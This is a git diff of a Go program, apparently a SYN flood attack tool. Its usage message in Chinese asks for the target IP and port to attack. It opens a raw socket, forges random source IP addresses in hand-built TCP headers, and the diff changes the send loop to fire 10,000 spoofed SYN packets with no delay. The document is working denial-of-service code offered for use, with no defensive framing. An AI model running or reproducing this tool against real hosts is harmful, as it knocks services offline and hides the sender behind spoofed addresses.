@@ -17,27 +17,27 @@ import (
 func main() {
 	//初始化
 	var (
-		err error
-		intPort int
-		fd syscall.Handle
-		targetPort string
-		targetIp string
-		socketAddr syscall.Sockaddr
-		packetHeader []byte
+		err              error
+		intPort          int
+		targetPort       string
+		targetIp         string
+		socketAddr       syscall.Sockaddr
+		packetHeader     []byte
 		targetPortUint64 uint64
 		targetPortUint16 uint16
 	)
 	//创建套接字
-	/*if fd , err = syscall.LoadLibrary("ws2_32.dll");err !=nil{
-		log.Println("加载dll文件出错：",err)
-		os.Exit(0)
-	}*/
-	//defer syscall.Close(fd)
-	if fd, err = syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP);err != nil {
-		log.Println("创建TCP套接字报错:", err)
-		os.Exit(-1)
+	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
+	if err != nil {
+		fmt.Println("An Error Occured When Creating Socket [!]", err.Error())
+		return
 	}
-	defer syscall.Close(fd)
+	// set socket options
+	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
+	if err != nil {
+		fmt.Println("Failed To Set Socket Options [!]", err.Error())
+		return
+	}
 	if len(os.Args) < 3 {
 		log.Println("请输入您要攻击的IP地址与端口号，本项目仅用于TCP socket")
 		log.Println("使用方法：an_syn_sent <target_ip_address> <target_port>")
@@ -45,30 +45,30 @@ func main() {
 	}
 	targetIp = os.Args[1]
 	targetPort = os.Args[2]
-	if intPort,err = strconv.Atoi(targetPort);err !=nil{
-		log.Println("端口号不正确:",err.Error())
+	if intPort, err = strconv.Atoi(targetPort); err != nil {
+		log.Println("端口号不正确:", err.Error())
 	}
-	if targetPortUint64, err = strconv.ParseUint(targetPort, 10, 16);err !=nil{
-		log.Println("转换目标port错误：",err.Error())
+	if targetPortUint64, err = strconv.ParseUint(targetPort, 10, 16); err != nil {
+		log.Println("转换目标port错误：", err.Error())
 	}
 	targetPortUint16 = uint16(targetPortUint64)
-	for{
-		time.Sleep(1*time.Second)
-		packetHeader = createPacketHeader(targetIp,targetPortUint16)
+	for i := 0; i < 10000; i++ {
+		packetHeader = createPacketHeader(targetIp, targetPortUint16)
 		socketAddr = &syscall.SockaddrInet4{
 			Port: intPort,
 			Addr: ipSplitFourByte(targetIp),
 		}
-		if err = syscall.Sendto(fd,packetHeader,0,socketAddr);err !=nil{
-			log.Println("SendTo err:",err.Error())
+		if err = syscall.Sendto(fd, packetHeader, 0, socketAddr); err != nil {
+			log.Println("SendTo err:", err.Error())
 		}
 	}
+	time.Sleep(3600 * 24 * 3 * time.Second)
 }
 
 /*
 创建包的请求头
- */
-func createPacketHeader(targetIp string,targetPort uint16) []byte{
+*/
+func createPacketHeader(targetIp string, targetPort uint16) []byte {
 	sourceAddr := createRandomIp()
 	packet := &MyFile.TCPHeader{
 		Source:      0xaa47, // Random ephemeral port
@@ -121,23 +121,23 @@ func createPacketHeader(targetIp string,targetPort uint16) []byte{
 
 /**
 创建随机IP地址
- */
-func createRandomIp() (lastIp string){
+*/
+func createRandomIp() (lastIp string) {
 	var ipSlice []string
 	rand.Seed(time.Now().UnixNano())
 	//0~255
-	for i:=0;i<4;i++{
-		ipSlice = append(ipSlice , strconv.Itoa(rand.Intn(252)))
+	for i := 0; i < 4; i++ {
+		ipSlice = append(ipSlice, strconv.Itoa(rand.Intn(252)))
 	}
-	lastIp = Implode(".",ipSlice)
-	fmt.Println("伪造IP地址为：",lastIp)
+	lastIp = Implode(".", ipSlice)
+	fmt.Println("伪造IP地址为：", lastIp)
 	return
 }
 
 /**
 将ip解析为4Byte的数据
- */
-func ipSplitFourByte(targetIp string) [4]byte{
+*/
+func ipSplitFourByte(targetIp string) [4]byte {
 	targetIpSliceString := strings.Split(targetIp, ".")
 	b0, err := strconv.Atoi(targetIpSliceString[0])
 	if err != nil {
@@ -151,7 +151,7 @@ func ipSplitFourByte(targetIp string) [4]byte{
 
 /**
 模拟php implode
- */
+*/
 func Implode(glue string, pieces []string) string {
 	var buf bytes.Buffer
 	l := len(pieces)
